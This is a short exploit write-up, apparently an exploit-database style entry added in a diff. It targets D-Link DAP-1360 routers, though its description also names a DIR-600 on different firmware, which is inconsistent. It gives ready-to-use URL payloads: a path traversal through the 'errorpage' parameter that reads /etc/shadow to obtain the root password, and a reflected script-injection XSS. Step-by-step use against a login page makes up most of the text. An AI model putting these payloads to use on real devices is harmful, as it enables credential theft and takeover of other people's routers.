@@ -1,0 +1,60 @@
+# Exploit Title: D-Link DAP-1360  File path traversal and Cross site
+scripting[reflected] can lead to Authentication Bypass easily.
+# Date: 20-07-2018
+# Exploit Author: r3m0t3nu11
+# Contact : http://twitter.com/r3m0t3nu11
+# Vendor : www.dlink.com
+# Version: Hardware version: F1
+Firmware version: 6.O5
+# Tested on:All Platforms
+
+
+1) Description
+
+After Successfully Connected to D-Link DIR-600
+Router(FirmWare Version : 2.01), Any User Can Bypass The Router's
+Root password as well bypass admin panel.
+
+D-Link DAP-1360  devices with v6.x firmware allow remote attackers to
+read passwords via a errorpage paramater which lead to absolute path
+traversal attack,
+
+Its More Dangerous when your Router has a public IP with remote login
+enabled.
+
+
+IN MY CASE,
+Tested Router IP : http://192.168.70.69/
+
+
+
+Video POC : https://www.dropbox.com/s/tvpq2jm3jv48j3c/D-link.mov?dl=0
+
+2) Proof of Concept
+
+Step 1: Go to
+Router Login Page : http://192.168.70.69:80
+
+Step 2:
+Add the payload to URL.
+
+Payload:
+getpage=html%2Findex.html&errorpage=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=dd&%3Aaction=login&%3Asessionid=3a6a085
+
+
+
+Now u can get root password by reading /etc/shadow.
+
+2- XSS
+  Step 1: Go to
+Router Login Page : http://192.168.70.69:80
+
+Step 2:
+Add the payload to URL.
+
+Payload:
+getpage=html%2Findex.html&errorpage=<Script>alert('r3m0t3nu11')</script>&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=dd&%3Aaction=login&%3Asessionid=3a6a085
+
+u will get r3m0t3nu11 name pop up as reflected xss
+
+Greetz to : Samir Hadji,0n3,C0ld Z3r0,alm3refh group,0x30 team,zero way team.
